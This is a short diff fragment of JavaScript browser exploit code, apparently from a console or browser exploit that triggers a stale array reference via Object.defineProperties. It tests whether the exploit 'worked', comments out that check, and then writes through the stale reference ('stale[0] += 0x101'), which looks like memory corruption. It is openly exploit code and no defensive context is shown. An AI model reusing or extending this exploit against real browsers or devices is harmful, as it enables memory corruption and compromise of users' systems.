@@ -144,13 +144,14 @@ for (var i = 0; i < 0x1000; i++){
  	Object.defineProperties(target, props);
  	stale = target.stale;
  	
-		 
+	/*
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
 		document.location.reload();
 	}
+	*/
 	
 	stale[0] += 0x101;
 	 
